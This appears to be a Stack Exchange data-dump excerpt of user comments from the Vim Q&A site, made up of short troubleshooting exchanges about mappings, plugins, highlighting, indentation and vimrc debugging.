  <row Id="13616" PostId="8132" Score="2" Text="Yeah, those look like good suggestions to me. You could have two mappings, depending on which file you wanted to jump to, or you could work that out automatically from the `+` or `-` at the start of the line and the filenames in the header." CreationDate="2016-06-07T23:22:27.203" UserId="7878" />
  <row Id="13617" PostId="8125" Score="0" Text="I think its split buffer." CreationDate="2016-06-08T03:31:15.083" UserId="7161" />
  <row Id="13618" PostId="5849" Score="0" Text="I will try to align the original code and check with the expected one. Only then I with be able to answer" CreationDate="2016-06-08T03:32:29.970" UserId="7161" />
  <row Id="13620" PostId="8125" Score="0" Text="@PeterRincker I understood the question as that the OP wanted to explicitly use buffer numbers. But looks like `:sb` would be possible as well.." CreationDate="2016-06-08T07:45:22.803" UserId="71" />
  <row Id="13621" PostId="8128" Score="0" Text="mapping `&lt;c-/&gt;` does not work reliably. See the [faq](https://vimhelp.appspot.com/vim_faq.txt.html#faq-20.5)" CreationDate="2016-06-08T07:52:15.960" UserId="71" />
  <row Id="13622" PostId="8135" Score="0" Text="Chqracter is mentioned as \u2630 under extend function in autoload/airline/init.vim" CreationDate="2016-06-08T09:21:07.857" UserId="7161" />
  <row Id="13623" PostId="8126" Score="2" Text="The substitution does not always have a known starting point : it was only to... correct a weird series of typo I made. But your answer is nonetheless interesting, thanks !" CreationDate="2016-06-08T10:11:29.893" UserId="7128" />
  <row Id="13624" PostId="8128" Score="0" Text="the plugin that I use the most: https://github.com/tomtom/tcomment_vim" CreationDate="2016-06-08T10:14:35.627" UserId="5108" />
  <row Id="13625" PostId="8136" Score="0" Text="Man, vim is huge; didn't even know diff_hlID existed. Thanks!" CreationDate="2016-06-08T10:27:13.967" UserId="7878" />
  <row Id="13626" PostId="8139" Score="5" Text="No. Stay in insert mode and press `&lt;Right&gt;` or (most auto-closing plugins let you do that) `)`or whatever the closing character is." CreationDate="2016-06-08T11:13:43.720" UserId="54" />
  <row Id="13627" PostId="8139" Score="2" Text="Alternatively, you could try to create a mapping for `()`,`{}` (exact pair without anything in them) that will override the plugin functionality. But as @romainl said, the plugin should do this by default." CreationDate="2016-06-08T11:40:22.040" UserId="1821" />
  <row Id="13628" PostId="8140" Score="0" Text="What happened? Why did you delete this? :(" CreationDate="2016-06-08T12:20:24.543" UserId="205" />
  <row Id="13629" PostId="8134" Score="4" Text="Your question title says it doesn't display ☰, and your question body is something else." CreationDate="2016-06-08T12:22:03.050" UserId="205" />
  <row Id="13630" PostId="8140" Score="0" Text="@muru Sorry, I realised that the answer had too many flaws. I don't know the syntax of `tlmgr`, i think but not&#xA;sure that you have to add the argument `install` after it. The substitution command or the while loop&#xA;are necessary only if there're several matches per line. But in this case there can only be one match&#xA;at most per line. So your syntax `:%call add(…)` is better, because it should work on more versions of Vim, while being shorter. Finally, your answer allows the user to stay in Vim, thanks to `inputsecret()` and `system()`." CreationDate="2016-06-08T12:37:24.503" UserId="6960" />
  <row Id="13631" PostId="8140" Score="0" Text="@muru So, all in all, I found this answer not very good. I undeleted it, in case someone finds something useful in it." CreationDate="2016-06-08T12:37:33.613" UserId="6960" />
  <row Id="13632" PostId="8140" Score="0" Text="I wouldn't worry too much about `tlmgr` syntax, I'm sure OP can figure that   out. :) But its always nice to have multiple ways to tackle a problem." CreationDate="2016-06-08T12:41:59.170" UserId="205" />
  <row Id="13634" PostId="8135" Score="0" Text="correct: `U+2630 Dec:9776 TRIGRAM FOR HEAVEN`" CreationDate="2016-06-08T14:29:59.470" UserId="71" />
  <row Id="13635" PostId="8141" Score="0" Text="It does not search for the pattern `\usepackage` in the whole file, or am I missing something?" CreationDate="2016-06-08T14:31:12.207" UserId="71" />
  <row Id="13636" PostId="8141" Score="0" Text="@ChristianBrabandt `%call ... getline(.)` - I'm calling matchstr on each line." CreationDate="2016-06-08T14:33:57.687" UserId="205" />
  <row Id="13637" PostId="8141" Score="0" Text="ah thanks, missed that" CreationDate="2016-06-08T14:36:00.880" UserId="71" />
  <row Id="13638" PostId="8142" Score="1" Text="That color is defined by your colorscheme." CreationDate="2016-06-08T14:39:30.030" UserId="54" />
  <row Id="13640" PostId="8137" Score="1" Text="Vimcasts episodes: [The Fugitive Series - a retrospective](http://vimcasts.org/blog/2011/05/the-fugitive-series/)" CreationDate="2016-06-08T16:15:55.780" UserId="778" />
  <row Id="13641" PostId="8127" Score="0" Text="Related post: [Search within syntax group?](http://vi.stackexchange.com/questions/7749/search-within-syntax-group)" CreationDate="2016-06-08T16:17:38.297" UserId="778" />
  <row Id="13642" PostId="8145" Score="1" Text="Can you add a screenshot?" CreationDate="2016-06-08T16:51:41.410" UserId="1821" />
  <row Id="13643" PostId="8127" Score="0" Text="That post links to the Q I posted. :P" CreationDate="2016-06-08T16:52:57.527" UserId="6489" />
  <row Id="13644" PostId="8145" Score="1" Text="This seems quite odd. I agree with @nobe4, I screenshot might be helpful. Other than that, does it behave the same if you start it on command line with `gvim -u NONE`?" CreationDate="2016-06-08T16:56:17.703" UserId="6489" />
  <row Id="13645" PostId="8136" Score="1" Text="Awesome! Only, unless I understand something wrong, I think your if statement should be `if... != 0` So that it breaks from searching when it lands on a diff. That's what seemed to work for me at lest. (I know your function wasn't intended to be complete, but I'm pretty sure this is backwards.)" CreationDate="2016-06-08T17:18:06.177" UserId="6489" />
  <row Id="13646" PostId="8145" Score="0" Text="@Tumbler41 , when i start with gvim -u NONE - it is all okey... There is no need for screenshot- just i press q- it prints q ? then i press shift + q ( uppercase) vim prints white spaces.... Seems this is due some plugin, right?" CreationDate="2016-06-08T17:25:02.223" UserId="7431" />
  <row Id="13647" PostId="8145" Score="1" Text="What's the output when you run `:imap` ?" CreationDate="2016-06-08T17:26:08.483" UserId="2920" />
  <row Id="13648" PostId="8145" Score="1" Text="It's either a plugin or your vimrc. The only thing that comes to mind that might be messing with that is perhaps a `conceal` highlighting command? So you might check for any of those, but that's just a stab in the dark." CreationDate="2016-06-08T17:28:44.517" UserId="6489" />
  <row Id="13649" PostId="8145" Score="0" Text="@Tumbler41 added vimrc . @ DJ McMayhem , if u can , please tell , how can i redirect output of imap to buffer?" CreationDate="2016-06-08T17:48:28.170" UserId="7431" />
  <row Id="13650" PostId="8145" Score="1" Text="I would disable the plugins a couple at time until you find the culprit. Just tell us if there's line involving `Q` coming from `:imap`, and what it is." CreationDate="2016-06-08T17:54:23.950" UserId="6489" />
  <row Id="13651" PostId="8145" Score="0" Text="@WhatsMyname [this](http://vim.wikia.com/wiki/Capture_ex_command_output) might be of interest to you. Although that's really not necessary. Just look through the output on your own and see if something is mapped to `Q`. Additionally, try `:iunmap Q`" CreationDate="2016-06-08T17:57:54.473" UserId="2920" />
  <row Id="13652" PostId="8138" Score="0" Text="Related: http://stackoverflow.com/questions/509690/how-can-you-list-the-matches-of-vims-search" CreationDate="2016-06-08T18:01:07.163" UserId="7926" />
  <row Id="13653" PostId="8146" Score="3" Text="Make sure to put this *after* all the plugin calls in your vimrc if you go this route." CreationDate="2016-06-08T18:01:14.017" UserId="6489" />
  <row Id="13655" PostId="8141" Score="0" Text="Awesome, thank you! Just two things: it should be `call inputsave()` there in the function's second line. And the second was my mistake, the command is actually `tlmgr install`. I changed those two lines and it works like a charm!" CreationDate="2016-06-08T19:44:09.130" UserId="7642" />
  <row Id="13656" PostId="8141" Score="0" Text="@danielbmarques my bad, corrected." CreationDate="2016-06-08T19:44:47.040" UserId="205" />
  <row Id="13657" PostId="8140" Score="0" Text="I accepted muru's answer because of the things you mentioned, but I loved your explanations, I didn't know about `\zs` and `\ze`. Also you're right, I forgot to add the `install` argument." CreationDate="2016-06-08T19:47:57.290" UserId="7642" />
  <row Id="13658" PostId="8148" Score="0" Text="It basically works! Thanks! Can you explain what all this &lt;expr and &lt;SID&gt; is doing? Like what should I search in help?" CreationDate="2016-06-08T19:55:08.417" UserId="6634" />
  <row Id="13659" PostId="8148" Score="1" Text="I wonder if you can use `input` here too, and just run the `:s` command directly." CreationDate="2016-06-08T20:00:24.833" UserId="205" />
  <row Id="13660" PostId="8143" Score="0" Text="When I run `:highlight` none of the colors match the one I don't like, including the `MoreMsg` highlighting group. Nothing changes when I put the line `hi MoreMsg term=bold ctermfg=black gui=bold guifg=black` in `~/.vim/colors/mine.vim`. Any idea why that might be?" CreationDate="2016-06-08T20:08:39.830" UserId="5043" />
  <row Id="13661" PostId="8136" Score="0" Text="@Tumbler41 I think this you are correct." CreationDate="2016-06-08T20:18:25.877" UserId="71" />
  <row Id="13663" PostId="8136" Score="0" Text="@ChristianBrabandt Mind editing for future readers? :)" CreationDate="2016-06-08T20:39:45.657" UserId="6489" />
  <row Id="13664" PostId="7856" Score="1" Text="I don't think there is any other difference.  It is fairly common in Unix / Unix-like command line tools to have separate commands as aliases for commonly used options.  For another example `zcat`, `gunzip -c`, and `gzip -cd` all do the same thing.  If you look in /usr/bin, you'll likely see a lot of commands are just symlinks to other commands.  These commands change their behavior based on the name they were called as." CreationDate="2016-06-08T22:00:01.023" UserId="1688" />
  <row Id="13665" PostId="8151" Score="3" Text="Just a note, `1G` doesn't work here because you are basically in command-line mode (or ex-mode for purists) and `1G` is a normal mode command." CreationDate="2016-06-08T22:42:47.663" UserId="6489" />
  <row Id="13666" PostId="8152" Score="0" Text="Thank you! You're right that `gf` is more native, but it doesn't work when there's a space the path (e.g. Window's  `Program Files`)." CreationDate="2016-06-08T23:31:07.733" UserId="7810" />
  <row Id="13667" PostId="8152" Score="1" Text="@bongbang that's part of the beauty of `gf` - what it includes can be customized using `isfname` (`:set isfname^=\ `), you can optionally add suffixes to check with `suffixesadd`, and if a file can't be found, it uses `includeexpr` which can be used to modify the filename how you want to check again. Though I suppose Ingo's version is far simpler." CreationDate="2016-06-08T23:51:24.793" UserId="205" />
  <row Id="13668" PostId="8151" Score="0" Text="FWIW, my answer to the linked question is *a lot* cleaner than that hack." CreationDate="2016-06-09T04:17:37.420" UserId="54" />
  <row Id="13669" PostId="8147" Score="0" Text="Do you want to substitute A with B irrespective of its lower,upper and Snake case? Many plugins do that." CreationDate="2016-06-09T05:17:42.317" UserId="7161" />
  <row Id="13670" PostId="8086" Score="1" Text="You have saved my fingers much agony. Thank you, sir." CreationDate="2016-06-09T05:19:38.550" UserId="7795" />
  <row Id="13671" PostId="8147" Score="1" Text="No, the point here is to substitute part of the word under cursor faster." CreationDate="2016-06-09T05:21:20.363" UserId="6634" />
  <row Id="13672" PostId="8146" Score="0" Text="E31: no such mapping .... - gvim says" CreationDate="2016-06-09T06:02:13.170" UserId="7431" />
  <row Id="13673" PostId="8145" Score="3" Text="Have a look at: http://vi.stackexchange.com/a/2004/1821 and http://vi.stackexchange.com/a/7723/1821" CreationDate="2016-06-09T06:28:51.590" UserId="1821" />
  <row Id="13674" PostId="8145" Score="2" Text="@WhatsMyname: &quot;There is no need for a screeenshot&quot;: Yes there is, you don't give details in your question so it's a good idea to let other people know what's wrong. And since `gvim -u NONE` solves the problem the other comments are right, see nobe4's link about how to debug your `.vimrc`." CreationDate="2016-06-09T07:42:55.760" UserId="1841" />
  <row Id="13675" PostId="8117" Score="0" Text="@lcd047: Then a patch must have changed this because on my version (`:version` says `rustines incluses: 1-1424, 1426-1558`) just like in the doc I linked it says &quot;read-only&quot;. I've searched [here](ftp://ftp.vim.org/pub/vim/patches/7.4/README) for a log of this change but couldn't find it." CreationDate="2016-06-09T08:02:09.063" UserId="1841" />
  <row Id="13676" PostId="8146" Score="0" Text="In my sens it solves OP's problem but does not address the issue of why this is happening.. Which may be more important than how to monkey patch it..." CreationDate="2016-06-09T08:02:30.460" UserId="1821" />
  <row Id="13677" PostId="8145" Score="0" Text="@WhatsMyname try this: `redir @a | imap | redir END | normal! &quot;ap` and you will have the result of `imap` in your buffer, then you can post it and. But otherwise, you really should disable all your plugins/configuration and proceed granularly to detect the point of failing (I wont repeat what's already in this answer: http://vi.stackexchange.com/questions/2003/how-do-i-debug-my-vimrc-file/2004#2004 )" CreationDate="2016-06-09T08:05:43.323" UserId="1821" />
  <row Id="13683" PostId="8143" Score="0" Text="@BenLindsay I've updated the answer with a few suggestions." CreationDate="2016-06-09T11:45:49.687" UserId="1405" />
  <row Id="13684" PostId="8155" Score="3" Text="Does this occurs when you start vim with `vim -Nu NONE` ?" CreationDate="2016-06-09T12:11:26.730" UserId="1821" />
  <row Id="13686" PostId="8155" Score="0" Text="No, then it is fine. However, with the problem presents, it only presents in that Python file." CreationDate="2016-06-09T12:14:13.733" UserId="2932" />
  <row Id="13687" PostId="8155" Score="4" Text="then have a look at http://vi.stackexchange.com/a/2004/1821 and if you find the line that cause the problem you can update your question." CreationDate="2016-06-09T12:16:57.913" UserId="1821" />
  <row Id="13688" PostId="8155" Score="2" Text="Nobe4's link is indeed a very good one, also check for lines involving `ttimeout` and `ttimeoutlen` they could be the culprits." CreationDate="2016-06-09T12:19:16.507" UserId="1841" />
  <row Id="13689" PostId="8155" Score="0" Text="I've updated my question." CreationDate="2016-06-09T12:24:53.563" UserId="2932" />
  <row Id="13690" PostId="8155" Score="2" Text="See the doc: [`:h :filetype-indent-on`](http://vimdoc.sourceforge.net/htmldoc/filetype.html#:filetype-indent-on). The line you're referring to makes Vim detect the filetype automatically and load the indent options for each filetype. Maybe an autocommand creates the problem on python buffers and is not loaded when you remove the filetype detection." CreationDate="2016-06-09T12:39:24.343" UserId="1841" />
  <row Id="13691" PostId="8155" Score="1" Text="Why would this problem only present on that Python file and not others?" CreationDate="2016-06-09T12:40:17.357" UserId="2932" />
  <row Id="13692" PostId="8155" Score="1" Text="You're saying that you've narrowed it down to `filetype indent on`.  What's the output is when you run this: `:verbose set indentexpr`?  Try `:set noautoindent` and see if the problem goes away.  You might be using a slow `indentexpr`." CreationDate="2016-06-09T12:45:16.903" UserId="5229" />
  <row Id="13693" PostId="8155" Score="0" Text="I don't know, I think that `filetype indent on` is not the actual cause of the problem and you only isolated a side effect. But I can be wrong..." CreationDate="2016-06-09T12:46:15.923" UserId="1841" />
  <row Id="13694" PostId="8155" Score="0" Text="@TommyA: `indentexpr=GetPythonIndent(v:lnum)` and `Last set from /usr/share/vim/vim74/indent/python.vim`. `noautoindent` had no effect." CreationDate="2016-06-09T12:47:43.720" UserId="2932" />
  <row Id="13695" PostId="8155" Score="0" Text="@statox: Quite possibly." CreationDate="2016-06-09T12:47:51.237" UserId="2932" />
  <row Id="13696" PostId="8117" Score="0" Text="@statox Hmm, it changed in an [update](https://github.com/vim/vim/commit/2b8388bd0175835eb751e6c58cd0b0b69465f0d9#diff-6f4e6b28f96d34117747184976b738dcR1195) to the runtime files, not in a Vim release.  That was in February 2015.  You can see the [latest version](https://github.com/vim/vim/blob/master/runtime/doc/change.txt) of the file at GitHub, but the relevant section doesn't appear to have changed since the commit I mentioned." CreationDate="2016-06-09T13:42:37.590" UserId="1577" />
  <row Id="13697" PostId="8155" Score="2" Text="@SabreWolfy strange.  You've tried `:verbose nmap O` to see if there aren't any maps prefixed with `O`?  Since you're saying this conditionally happens, there shouldn't be any, but it wouldn't hurt to check.  At this point, I'd start disabling plugins to see which one is causing it, if any." CreationDate="2016-06-09T13:48:15.220" UserId="5229" />
  <row Id="13698" PostId="8117" Score="0" Text="@muru I suppose you can look at it like that too, but Perl's `/e` can run essentially any command, while Vim's `\=` is limited to expressions.  It's actually the `=` register under the hood." CreationDate="2016-06-09T13:48:32.447" UserId="1577" />
  <row Id="13699" PostId="8156" Score="0" Text="You can use a autocommand to solve this. If you know which type of files specifically, you can give the extension. Else you can give like `:au BufEnter *.* :set relativenumber!` in vimrc and try again." CreationDate="2016-06-09T14:17:27.903" UserId="7161" />
  <row Id="13700" PostId="8156" Score="4" Text="Don't use someone else's config." CreationDate="2016-06-09T14:17:35.807" UserId="54" />
  <row Id="13701" PostId="8156" Score="0" Text="@romaini I knew I was going to get that" CreationDate="2016-06-09T15:00:57.263" UserId="1336" />
  <row Id="13702" PostId="8156" Score="0" Text="@SibiCoder, thanks but I'm also afraid other setting are persisting file by file this way. I don't understand why this is happening at all...where is this state being stored?" CreationDate="2016-06-09T15:10:00.753" UserId="1336" />
  <row Id="13703" PostId="8156" Score="1" Text="Actually, even if you were expecting romainl's comment, he is right: your best chance to find where the problem comes from is to follow the steps in the answer of [this question](http://vi.stackexchange.com/q/2003/1841) and it is much easier to do when you know what everything does in your configuration file :-)" CreationDate="2016-06-09T15:11:52.540" UserId="1841" />
  <row Id="13704" PostId="8156" Score="0" Text="@statox I agree with all of you. Spf was nice at first, but getting to be a pain down the road." CreationDate="2016-06-09T15:15:09.643" UserId="1336" />
  <row Id="13705" PostId="8156" Score="1" Text="Try `:verbose set rnu?` to find out, where it was set. But in general I agree, do not use sombody elses configuration, if you do not understand it." CreationDate="2016-06-09T15:15:16.263" UserId="71" />
  <row Id="13706" PostId="8156" Score="0" Text="After reading (really quickly) his vimrc I don't see what could create the problem but I have one doubt: if you add `let g:spf13_no_views = 1` to your `vimrc.local` and try to remove the view files of the directory described in `g:spf13_consolidated_directory` do you still get the problem? Otherwise the configuration comes with **a lot** of plugin try to comment out the lines 77-79 (with `source ~/.vimrc.bundles`). Finally I think that's a good occasion to start writting a `.vimrc` from scratch ;-)" CreationDate="2016-06-09T15:26:26.020" UserId="1841" />
  <row Id="13707" PostId="8156" Score="0" Text="thanks. Using @ChristianBrabandt's suggeestion the problem is ~/.vimviews, also mentioned here: http://stackoverflow.com/questions/15399618/where-does-vim-store-custom-key-mapping-cache" CreationDate="2016-06-09T15:28:20.960" UserId="1336" />
  <row Id="13708" PostId="8156" Score="1" Text="Proof #2048 that those distributions are bad." CreationDate="2016-06-09T15:42:19.053" UserId="54" />
  <row Id="13709" PostId="8151" Score="0" Text="@Tumbler41 How dumb of me! I thought `1G` was a command-line mode, too. Somehow, although I never did `:1G`, I thought it would work until I tried just now." CreationDate="2016-06-09T16:06:34.973" UserId="7810" />
  <row Id="13710" PostId="8157" Score="1" Text="It worked in my vim. Mine is 7.2" CreationDate="2016-06-09T16:10:32.520" UserId="7161" />
  <row Id="13711" PostId="8157" Score="1" Text="Same as @SibiCoder here, macvim 7.4. Can you try with `vim -Nu NONE` ?" CreationDate="2016-06-09T16:50:41.413" UserId="1821" />
  <row Id="13713" PostId="8158" Score="0" Text="What do you mean `not implemented`? Do you mean without entering visual mode?" CreationDate="2016-06-09T17:27:08.077" UserId="2920" />
  <row Id="13714" PostId="8158" Score="0" Text="I mean when you press the v key and it says it isn't implemented." CreationDate="2016-06-09T17:27:46.153" UserId="1065" />
  <row Id="13715" PostId="8158" Score="0" Text="@leeand00 are marks available?" CreationDate="2016-06-09T17:28:42.990" UserId="205" />
  <row Id="13716" PostId="8158" Score="0" Text="Well that's a strange error that I've never heard of before. Does it still say that when you launch vim with `vim -u NONE -i NONE`?" CreationDate="2016-06-09T17:29:10.227" UserId="2920" />
  <row Id="13717" PostId="8158" Score="0" Text="@muru it's complain about it, but it doesn't seem to work either." CreationDate="2016-06-09T17:31:37.730" UserId="1065" />
  <row Id="13718" PostId="8158" Score="2" Text="@DJMcMayhem it's vi" CreationDate="2016-06-09T17:31:56.797" UserId="1065" />
  <row Id="13719" PostId="8158" Score="0" Text="One other question, by copy/paste, do you mean yank/put, or are you wanting to access the system clipboard?" CreationDate="2016-06-09T17:33:59.863" UserId="6489" />
  <row Id="13720" PostId="8158" Score="0" Text="@Tumbler41 yank." CreationDate="2016-06-09T17:34:29.323" UserId="1065" />
  <row Id="13721" PostId="8158" Score="2" Text="I'm working on OpenWRT." CreationDate="2016-06-09T17:34:51.580" UserId="1065" />
  <row Id="13722" PostId="8058" Score="0" Text="@guntbert Please modify the answer so that I can accept it. The problem can be solved in the following way: 1. install vim color scheme as in the original post. 2. if the terminal vim does not display color correctly, install the terminal color scheme as in github.com/Anthony25/gnome-terminal-colors-solarized . If there is still problem, the FAQ in that page might help" CreationDate="2016-06-09T17:37:42.147" UserId="1080" />
  <row Id="13723" PostId="8159" Score="1" Text="When I do that and try to paste it says 'nothing in register D'" CreationDate="2016-06-09T17:40:20.317" UserId="1065" />
  <row Id="13724" PostId="8159" Score="0" Text="That's quite weird. It seems put is trying to use register D for some reason. What happens if you do `&quot;&quot;p`? (That's TWO double quotes and then a p.)" CreationDate="2016-06-09T17:49:40.710" UserId="6489" />
  <row Id="13725" PostId="8130" Score="0" Text="How can i have it so pressing ctrl+m again will remove the comments? Toggle them on and off." CreationDate="2016-06-09T18:19:14.707" UserId="7911" />
  <row Id="13726" PostId="8160" Score="1" Text="Why do you have so many `&lt;left&gt;` and `&lt;right&gt;`? This works just fine for me: `noremap &lt;C-m&gt; :exe &quot;normal! I&quot;.g:commentType&lt;CR&gt;`" CreationDate="2016-06-09T19:18:33.717" UserId="2920" />
  <row Id="13727" PostId="8161" Score="0" Text="I've tried  nnoremap &lt;C-m&gt; gcc with tpop vim commentary, but it doesn't work. Any idea why? gcc works tho." CreationDate="2016-06-09T19:39:21.167" UserId="7911" />
  <row Id="13728" PostId="8161" Score="3" Text="@ditto Whoops, my bad. I say `nnoremap` by default. In this case you want `nmap` since `gcc` itself is a mapping. (see [here](http://vi.stackexchange.com/questions/2089/what-are-the-differences-between-the-map-noremap-abbrev-and-noreabbrev-command))" CreationDate="2016-06-09T19:41:23.853" UserId="2920" />
  <row Id="13729" PostId="8161" Score="0" Text="Awesome, have it working now. Tar. Am I able to highlight several rows and toggle them in 1 go? I've tried a few times and can't seem to get it working." CreationDate="2016-06-09T19:48:49.847" UserId="7911" />
  <row Id="13731" PostId="8161" Score="2" Text="@ditto With `&lt;C-m&gt;`? Surround vim's mapping for visual mode is `gc` so if you want that to work you'll have to do `xmap &lt;C-m&gt; gc`." CreationDate="2016-06-09T19:50:39.620" UserId="2920" />
  <row Id="13732" PostId="8163" Score="2" Text="This is just the `Cursor` highlight group. There is no differentiation between when there is a visual selection or not. I think your only option is to change what color your cursor is." CreationDate="2016-06-09T20:44:38.523" UserId="6489" />
  <row Id="13733" PostId="8086" Score="0" Text="@Azmodeus Glad it helped.  vim-surround is such a productivity booster that you should take the time to follow along with its docs.  And just in case you did't know, emmet-vim will work in pre-compiled stylesheets like sass or less.  For example, try this in a scss file: `.col$*5&gt;.inner`" CreationDate="2016-06-09T20:53:55.137" UserId="5229" />
  <row Id="13734" PostId="8165" Score="0" Text="The problem with copying the substitute command or the regex on another register is (as noted on the question) the need to avoid using that register again. If I record a macro and use the `z` register as auxiliary, and them start recording another macro, I have to remember to check if the previously recorded macro used some auxiliary register. This get out of hand if you need to record a third or fourth macro, thus it is  still better to retype the command." CreationDate="2016-06-09T21:47:11.987" UserId="1405" />
  <row Id="13735" PostId="8165" Score="0" Text="@mMontu Yes, I saw that after I posted. Sorry I'll try to read more thoroughly in the future. I've updated my answer with a possible workaround." CreationDate="2016-06-09T21:59:22.073" UserId="6489" />
  <row Id="13736" PostId="8165" Score="0" Text="You can always store the pattern in a variable, e.g. `:let search=@/`, and insert that into your macro with `^R=search&lt;CR&gt;`." CreationDate="2016-06-09T22:01:15.570" UserId="7878" />
  <row Id="13737" PostId="8163" Score="3" Text="Or you could stop the cursor from blinking altogether. [Instructions here](https://wiki.gnome.org/action/show/Apps/Terminal/FAQ?action=show&amp;redirect=Terminal%2FFAQ#How_can_I_change_a_profile_setting_from_the_command_line.3F)." CreationDate="2016-06-09T22:16:12.843" UserId="7878" />
  <row Id="13738" PostId="8165" Score="0" Text="@Antony @Tumbler41 Thanks for the ideas! Both are better than retyping. But I still believe there is something more direct (such as improved `^R&lt;register&gt;` which inserts the register contents) or an improved workflow. This task seems to be common enough to have an easier solution." CreationDate="2016-06-09T22:29:17.040" UserId="1405" />
  <row Id="13739" PostId="8158" Score="0" Text="Busybox vi is terrible. Install a better implementation if you can." CreationDate="2016-06-09T22:49:23.287" UserId="7878" />
  <row Id="13740" PostId="8165" Score="0" Text="Well, I wouldn't class this solution as difficult:  you're just giving the search register an alternative name, and referring to that in the macro. You can create mappings for saving and inserting the search pattern if that helps." CreationDate="2016-06-09T23:14:37.987" UserId="7878" />
  <row Id="13741" PostId="8167" Score="1" Text="Found some help at &quot;[Learn Vimscript the Hard Way](http://learnvimscriptthehardway.stevelosh.com/chapters/12.html)&quot;" CreationDate="2016-06-10T00:36:16.220" UserId="182" />
  <row Id="13742" PostId="8167" Score="1" Text="`autocmd FileType sh nnoremap &lt;F3&gt; :%s:\$OLD:\~/new:gc&lt;cr&gt;` works for me, but doesn't answer the question of what I did wrong the first time round" CreationDate="2016-06-10T00:39:22.113" UserId="182" />
  <row Id="13746" PostId="2060" Score="0" Text="@In78 It means the &lt;kbd&gt;\&lt;/kbd&gt; key on most computers. For example `&lt;leader&gt;r` means &lt;kbd&gt;\&lt;/kbd&gt;+&lt;kbd&gt;r&lt;/kbd&gt; on my computers. Vim manual has an entry for it: `:help leader`" CreationDate="2016-06-10T00:55:25.557" UserId="7939" />
  <row Id="13747" PostId="8169" Score="2" Text="I think you are looking for `Ctrl+o` and `Ctrl+i` ... `:h jump-motions` for more info" CreationDate="2016-06-10T03:44:25.750" UserId="1616" />
  <row Id="13748" PostId="8169" Score="0" Text="@spasic thats not a bad suggestion, but once you make a  few dozen jumps, the position would be lost in a massive jump list. By scoping the marks to the buffer you  have a smaller list of marks/locations to manage" CreationDate="2016-06-10T03:50:16.970" UserId="4603" />
  <row Id="13749" PostId="8149" Score="0" Text="Thanks, that's the way I would go for. The easiest way to to type `&lt;Right&gt;` in Insert Mode, but obviously it is less efficient, since the hand need to left the main area to a corner. Moreover, for people who use HHKB pro, typing &lt;Right&gt; implies `Fn +'`, which is also sub-optimal." CreationDate="2016-06-10T10:36:57.317" UserId="7916" />
  <row Id="13750" PostId="8169" Score="0" Text="If you didn't read it already, I think [this tip](http://vim.wikia.com/wiki/Restore_cursor_to_file_position_in_previous_editing_session) would be interesting. Maybe you'll have to tweak your `viminfo`" CreationDate="2016-06-10T12:17:40.973" UserId="1841" />
  <row Id="13751" PostId="8169" Score="0" Text="@statox  thanks. I saw that and the tip in the vim help. I think those solutions cause automatic jumping to the `&quot;` mark when you open a file. I really wanted to only jump to the last cursor position manually. Also, I just couldn't make sense of when the `&quot;` mark gets set and updated so to me the `&quot;` mark is unusable." CreationDate="2016-06-10T12:28:44.983" UserId="4603" />
  <row Id="13752" PostId="8172" Score="0" Text="thanks, this seems like it could really be useful. I've loaded it into my vimrc to try it out. I've changed to autocmd to `WinLeave` as I've noticed `BufLeave` doesn't seem to fire when you close a split and the buffer is still open somewhere else. I know its a bit of an edge case, but `WinLeave` seems to work over a wider range of &quot;file closing&quot; type situations, but I'm still just testing..." CreationDate="2016-06-10T12:32:37.423" UserId="4603" />
  <row Id="13753" PostId="8177" Score="1" Text="I would suggest you create your own command that call exactly what you already have. The plugin does not seems to provide this level of customisation. As for the leader key, you can do `nnoremap &lt;leader&gt;as :execute 'AS' | wincmd J`." CreationDate="2016-06-10T13:49:28.847" UserId="1821" />
  <row Id="13754" PostId="8178" Score="0" Text="Thanks for the edit, comment and proposal. If I do `nnoremap &lt;leader&gt;as :execute 'AS' | wincmd J` when I do the leader command. I see on the command line `execute 'AS'` but nothing happen. `nnoremap &lt;leader&gt;as :bel AS&lt;cr&gt;` execute AS command but not the window mouvement." CreationDate="2016-06-10T14:26:35.793" UserId="3357" />
  <row Id="13755" PostId="8178" Score="0" Text="Updated, does it work now?" CreationDate="2016-06-10T14:30:18.407" UserId="1821" />
  <row Id="13756" PostId="8173" Score="1" Text="It looks like you've accidentally `:set lisp` somewhere. It could be other settings such as `'cindent'` as mentioned in @ntnn's answer." CreationDate="2016-06-10T14:47:30.847" UserId="7878" />
  <row Id="13757" PostId="8178" Score="0" Text="`nnoremap &lt;leader&gt;as :execute 'AS' &lt;bar&gt; wincmd J&lt;CR&gt;` works perfectly ! No success with `nnoremap &lt;leader&gt;as :bel AS&lt;CR&gt;` :) Still open on the top of the window" CreationDate="2016-06-10T15:02:34.537" UserId="3357" />
  <row Id="13758" PostId="8135" Score="0" Text="Thanks now its clear to me." CreationDate="2016-06-10T18:05:04.147" UserId="7919" />
  <row Id="13759" PostId="8176" Score="0" Text="Yes, after the update from Chris i did the same. Thanks." CreationDate="2016-06-10T18:05:28.857" UserId="7919" />
  <row Id="13760" PostId="8180" Score="0" Text="Thank you Sir! That works as expected.&#xA;(Is there a way to vote for an answer? Or something like Facebook &quot;Like&quot;?)" CreationDate="2016-06-10T21:51:41.087" UserId="7953" />
  <row Id="13761" PostId="8180" Score="0" Text="@yong321 Glad to hear it helped you! There are two options for voting for an answer: `1.` voting for an answer, which you will be able to do [when you have 15 reputation](http://vi.stackexchange.com/help/privileges/vote-up) and `2.` accepting an answer (clicking the green checkmark). You can read more about both of those [here](http://vi.stackexchange.com/help/someone-answers)" CreationDate="2016-06-10T21:56:21.707" UserId="2920" />
  <row Id="13762" PostId="7691" Score="0" Text="Vim already works well with small screens: 80x24 characters. As for touch screens, [this was asked before](http://vi.stackexchange.com/q/13/51)." CreationDate="2016-06-10T22:46:46.130" UserId="51" />
  <row Id="13763" PostId="8184" Score="3" Text="You might like [easymotion](https://github.com/easymotion/vim-easymotion)" CreationDate="2016-06-11T02:31:11.737" UserId="205" />
  <row Id="13764" PostId="8184" Score="0" Text="Is there a particular feature of easymotion that addresses my specific concern?" CreationDate="2016-06-11T02:32:20.880" UserId="7956" />
  <row Id="13765" PostId="8184" Score="0" Text="For moving within a line, `f`/`F`/`t`/`T` can be quite useful, and with easy motion, it becomes easier to use them. Have a look at the examples in the README." CreationDate="2016-06-11T02:36:05.050" UserId="205" />
  <row Id="13766" PostId="8184" Score="1" Text="@w.brian easymotion enables you to toggle shortcuts to quickly jump to words, lines, and so on.  This directly addresses your concern of not `navigating one character or word at a time`." CreationDate="2016-06-11T02:37:56.867" UserId="5229" />
